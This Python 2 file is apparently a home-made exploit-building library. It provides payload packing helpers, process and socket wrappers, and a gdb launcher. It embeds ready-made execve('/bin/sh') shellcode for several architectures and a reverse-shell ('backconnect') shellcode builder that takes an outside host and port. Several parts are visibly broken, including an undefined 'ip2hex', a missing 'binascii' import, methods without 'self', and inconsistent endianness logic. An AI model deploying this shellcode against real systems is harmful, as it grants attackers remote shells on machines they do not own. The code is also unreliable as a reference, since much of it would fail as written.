####################################################
# Small tool for building exploit payload on Linux #
# 												   #	
# Author: h4niz 								   #
####################################################

#-*-coding: utf-8-*_
import subprocess
import os
import socket
import struct
import sys


# ***************** GLOBAL DEFINE **********

# Signal return code
global sigreturn
sigreturn = {1: 'Hangup (POSIX)', 2: 'Interrupt (ANSI)', 3: 'Quit (POSIX)', 4: 'Illegal Instruction (ANSI)', 5: 'Trace trap (POSIX)', 6: 'Abort (ANSI)', 7: 'BUS error (4.2 BSD)', 8: 'Floating-Point arithmetic Exception (ANSI). ', 9: 'Kill, unblockable (POSIX)', 10: 'User-defined signal 1', 11: 'Segmentation Violation (ANSI)', 12: 'User-defined signal 2', 13: 'Broken pipe (POSIX)', 14: 'Alarm clock (POSIX)', 15: 'Termination (ANSI)', 16: 'Stack fault', 17: 'Child status has changed (POSIX)', 18: 'Continue (POSIX)', 19: 'Stop, unblockable (POSIX)', 20: 'Keyboard stop (POSIX)', 21: 'Background read from tty (POSIX)', 22: 'Background write to tty (POSIX)', 23: 'Urgent condition on socket (4.2 BSD)', 24: 'CPU limit exceeded (4.2 BSD)', 25: 'File size limit exceeded (4.2 BSD)', 26: 'Virtual Time Alarm (4.2 BSD)', 27: 'Profiling alarm clock (4.2 BSD)', 28: 'Window size change (4.3 BSD, Sun)', 29: 'Pollable event occurred (System V)', 30: 'Power failure restart (System V)', 31: 'Bad system call'}

# Ascii color
global bcolors
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
# ----------------  END DEFINE -------------

# These functions below were defined for helping to build payload purpose
# ******** PACKING **********
# Pack number
# 	p8: pack 1bytes
# 	p16: pack 2 bytes
# 	p32: pack 4 bytes
# 	p64: pack 8 bytes
def p8(data):
	p = struct.pack("<B", data)
	if(__ENDIAN__ == "little"): 
		return p
	return p[::-1]

def p16(data):
	p = struct.pack(">H", data)
	if(__ENDIAN__ == "bigger"): 
		return p
	return p[::-1]

def p32(data):
	p = struct.pack(">I", data) 
	if(__ENDIAN__ == "bigger"): 
		return p
	return p[::-1]

def p64(data):
	p = struct.pack(">Q", data) 
	if(__ENDIAN__ == "bigger"): 
		return p
	return p[::-1]
# -------- END PACKING --------

# ******** UNPACKING **********
# Unpack 2 number
# 	u8: unpack 1bytes
# 	u16: unpack 2 bytes
# 	u32: unpack 4 bytes
# 	u64: unpack 8 bytes
def u8(data):
	assert len(data) == 1
	return struct.unpack("<B", data)
def u16(data):
	assert len(data) == 2
	if __ENDIAN__ == "little":
		return struct.unpack("<H", data)
	return struct.unpack(">H", data)
def u32(data):
	assert len(data) == 4
	if __ENDIAN__ == "little":
		return struct.unpack("<I", data)
	return struct.unpack(">I", data)
def u64(data):
	assert len(data) == 8
	if __ENDIAN__ == "little":
		return struct.unpack("<Q", data)
	return struct.unpack(">Q", data)
# -------- END UNPACKING --------

# -------- CONVERT IP2HEX -------
def ip2hexstr(ip):
	res = ""
	ipl = str(ip).split(".")
	for i in ipl:
		res += p8( int(i, 10) )
	return res 

def hexstr2ip(he):
	assert len(he)%4 == 0
	res = ""
	hel = he.split("\\x")
	for i in hel:
		res += str(u8((binascii.unhexlify(i)))) + "."
		return res 

def in2hexstr(ins):
	return struct.pack("<H", ins)


# ******** END CONVERT **********
# ***************** CONTEXT ****************
# This class is used to define architecture, os, endian
def context(arch='i386', os='linux', endian='little'):
	global __ARCH__, __OS__, __ENDIAN__ 

	__ARCH__ = arch
	__OS__ = os 
	__ENDIAN__ = endian

	def os(os):
		__OS__ = os
	def arch(arch):
		__ARCH__ = arch
	def endian(endian):
		__ENDIAN__ = endian		

	return __ARCH__, __OS__, __ENDIAN__
# ----------------  END CONTEXT -----------------

# ***************** PROCESS ****************
# This class is used to local debug. Run binary through subprocess.
class process():	
	def __init__(self, path2file, stdin=None, stdout=None, stderr=None):
		self.path2file = path2file
		self.stdin = stdin
		self.stdout = stdout
		self.stderr = stderr

		#pipe for stdout
		self.ostdout, self.ostdin = os.pipe()
		self.ostdin = os.fdopen(self.ostdin, 'w')
		#pipe for stdin
		self.istdout, self.istdin = os.pipe()
		self.istdin = os.fdopen(self.istdin, 'w')

		# os.dup2(0, self.istdout)
		# ---END -------

		try:
			self.proc = subprocess.Popen(path2file, stdin=self.istdout, stdout=self.ostdin, stderr=self.ostdin)

			print bcolors.OKGREEN + "[->] Run file successful!\n" + bcolors.ENDC
		except Exception as ex:
			print bcolors.FAIL + "[SubProcess] Error: {}".format(ex) + bcolors.ENDC
			exit()


	#Receive data
	def recv(self, numberbyte):
		return os.read(self.ostdout, numberbyte)

	def recvuntil(self, data):
		buf = self.recv(1)
		print buf
		while data not in buf:
			buf += self.recv(1)
		return buf

	def recvline(self):
		return self.recvuntil("\n")


	#Send data
	def send(self, data):
		return os.write(self.istdin.fileno(), data)

	def sendline(self, data):
		return os.write(self.istdin.fileno(), data + '\n')


	#Other methods
	def pid():
		return self.proc.pid()

	def close(self):
		return self.proc.kill()

	def interactive(self):
		self.proc.wait()
		returncode = self.proc.returncode
		if returncode != None:		
			print bcolors.FAIL + sigreturn[int(returncode)*-1] + bcolors.ENDC	

		os.dup2(1, self.ostdin.fileno())
		os.dup2(2, self.ostdin.fileno())
		while True:
			print self.recv(0x1000)
			self.sendline( raw_input("> ") )

		return None
# ----------------  END PROCESS -----------------


# ***************** REMOTE ****************
# This class is used to remote. Communicate with server via socket.
class remote():
	def __init__(self, server):
		self.server = server
		global sock
		self.sock = socket.socket()
		try:
			print "Connecting to host {} on port {}".format(server[0], server[1])
			self.sock.connect(server)
			print bcolors.OKGREEN + "[->] Connected!\n" + bcolors.ENDC	
		except Exception as ex:
			print bcolors.FAIL + "[SOCKET] Error: {}".format(ex) + bcolors.ENDC
			exit()



	def send(self, data):
		return self.sock.send( data )

	def sendline(self, data):
		return self.sock.send( data + "\n" )

	def recv(self, numbyte):
		return self.sock.recv(numbyte)

	def recvline(self):
		buf = self.sock.recv(1)
		while "\n" not in buf:
			buf += self.sock.recv(1)

		return buf 

	def recvuntil(self, data2stop):
		buf = self.sock.recv(1)
		while data2stop not in buf:
			buf += self.sock.recv(1)
		return buf

	def close(self):
		return self.sock.close()

	def interactive(self):
		while True:
			print "[{}]: ".format(self.sock.getsockname()[0]) + self.sock.recv(0x1000)
			stdinline = raw_input("[Me]: ")
			if "ExitInteractive" in stdinline:
				break;
				try:
					self.sock.close()
					print "Closed socket {} successful!".format(self.sock.getsockname())
				except Exception as ex:
					print "[SOCKET] Error: {}".format(ex)	

			self.sock.send( stdinline )
		return None
# ----------------  END REMOTE -----------------


# ***************** SHELLCODE ****************
class shellcode:
	def __init__(self, os = __OS__, arch=__ARCH__):
		self.arch = arch
		self.os = os

	def sh():
		if self.os == 'linux':
			if self.arch == 'i386': return "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
			else: return "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
		elif self.os == 'arm':
			return "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0c\x30\xc0\x46\x01\x90\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"

	def backconnect(host, port):
		if self.os == 'linux':
			if self.arch == 'i386':
				sc = "\x68"
				sc += ip2hex(host)  # <- IP Number
				sc +="\x5e\x66\x68"
				sc += in2hexstr(port)          # <- Port Number
				sc +="\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02"
				sc +="\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79"
				sc +="\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a"
				sc +="\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f"
				sc +="\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
				sc +="\xeb\xce"

				return sc 
# ----------------  END SHELLCODE -----------------


# ***************** GDB ****************
# This class is used to attach process into gdb to local debug
class gdb:
	def __init__(self, procObj, breakpoint):
		self.pid = procObj.pid()
		self.breakpoint = breakpoint


	def attach(self):
		print "[" + bcolors.OKGREEN + "b" + bcolors.ENDC + "] COMMANDS LIST"
		print "\t\t\t" + self.breakpoint

		data = ""
		if self.breakpoint:
			data += self.breakpoint
		with open("/tmp/h4nizattach.dbg", "w+") as f:
			f.write(data)

		try:
			g = subprocess.Popen(['gnome-terminal', '-x', 'gdb', '--pid', str(self.pid), '-x', '/tmp/h4nizattach.dbg'])
		except:
			pass

		g.wait()
		if g.returncode != None:
			g.kill()	
# ----------------  END GDB -----------------

# ***************** GDB ****************
class ida():
	def __init__(self, targetobj, params=None):
		self.targetobj = targetobj
		self.params = params
# ----------------  END IDA -----------------




